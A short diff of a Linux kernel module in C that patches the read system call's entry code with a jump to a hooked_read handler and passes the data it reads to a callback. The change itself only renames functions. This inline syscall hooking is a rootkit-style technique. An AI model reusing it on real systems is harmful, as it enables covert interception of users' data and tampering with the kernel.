@@ -29,7 +29,7 @@ static fun_void_charp_int callback_function;
 
 static asmlinkage ssize_t internal_hooked_read(unsigned int fd, char __user *buf, size_t count);
 
-static asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
+static asmlinkage ssize_t hooked_read_old(unsigned int fd, char __user *buf, size_t count){
     ssize_t retval;
     retval = internal_hooked_read(fd, buf, count);
     printk(KERN_INFO "Hooked read: %d\n", retval);
@@ -52,7 +52,7 @@ void *_memcpy(void *dest, const void *src, int size, int correctrights){
     return dest;
 }
 
-asmlinkage ssize_t new_syscall(unsigned int fd, char __user *buf, size_t count){
+asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     void** sys_call_table = (void *) ptr_sys_call_table;
     ssize_t retval;
     OUR_TRY_MODULE_GET;
@@ -131,7 +131,7 @@ void hook_read(fun_void_charp_int cb){
         callback_function = cb;
     }
 
-    *(int *)&new_syscall_code[1] = ((int)new_syscall) - ((int)sys_call_table[SYSCALL_NR] + 5);
+    *(int *)&new_syscall_code[1] = ((int)hooked_read) - ((int)sys_call_table[SYSCALL_NR] + 5);
 
     
     _memcpy( syscall_code, sys_call_table[SYSCALL_NR], sizeof(syscall_code), 0);
